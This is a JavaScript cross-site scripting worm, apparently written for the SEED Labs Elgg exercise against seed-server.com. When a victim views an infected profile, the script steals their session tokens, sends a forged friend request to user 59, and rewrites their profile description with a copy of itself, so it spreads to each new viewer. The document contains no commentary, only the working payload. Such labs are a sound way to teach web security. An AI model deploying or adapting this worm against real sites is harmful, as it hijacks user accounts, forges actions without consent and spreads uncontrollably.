<script id="worm" type="text/javascript">
window.onload = function () {
    var samyGuid = "59";
    var guid = elgg.session.user.guid;
    if (guid == samyGuid) return;

    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var userName = "name=" + elgg.session.user.name;

    // Step 1: Add Samy as a friend
    var friend_id = 59;
    var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + friend_id + ts + token;
    var xhr1 = new XMLHttpRequest();
    xhr1.open("GET", addFriendUrl, true);
    xhr1.send();

    // Step 2: Build worm code from current DOM
    var headerTag = "<script id=\\\"worm\\\" type=\\\"text/javascript\\\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    // Step 3: Modify victim's profile
    var aboutMe = "&description=YOU HAVE BEEN HACKED :)(DOM BASED) " + wormCode;
    var content = token + ts + aboutMe + "&guid=" + guid + "&" + userName;
    var editProfileUrl = "http://www.seed-server.com/action/profile/edit";

    var xhr2 = new XMLHttpRequest();
    xhr2.open("POST", editProfileUrl, true);
    xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr2.send(content);
};
</script>
